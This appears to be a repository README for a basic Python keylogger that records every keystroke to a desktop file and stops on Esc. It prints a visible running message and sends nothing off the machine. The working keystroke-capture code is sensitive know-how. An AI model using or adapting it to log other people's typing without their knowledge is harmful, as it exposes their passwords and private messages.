# Keylogger Script

This repository contains a Python script that implements a basic keylogger. The script captures and logs keystrokes, saving them to a file named `keys.txt` on the user's desktop.

## Overview

- **Functionality**: The keylogger monitors and records each keystroke.
- **Storage**: Keystrokes are saved in `keys.txt` on the desktop.
- **Control**: The script stops recording when the `Esc` key is pressed.

## Code Explanation

```python
import keyboard  # Import the keyboard library
import os

# Define the file path for saving keystrokes
desktop_path = os.path.expanduser("~/Desktop")  # Get the path to the desktop
log_file = os.path.join(desktop_path, "keys.txt")  # Define the full file path

def log_key(keyboard_event):
    with open(log_file, "a") as f:
        if keyboard_event.name:  # Check if the key has a name attribute
            f.write(f"{keyboard_event.name}\n")  # Write the key to the file

# Set up the keylogger
keyboard.on_press(log_key)  # Register the function to be called on each key press

# Run the keylogger until 'esc' is pressed
print("Keylogger is running. Press 'Esc' to stop.")
keyboard.wait('esc')  # Block program execution until 'esc' is pressed
print("Keylogger stopped.")
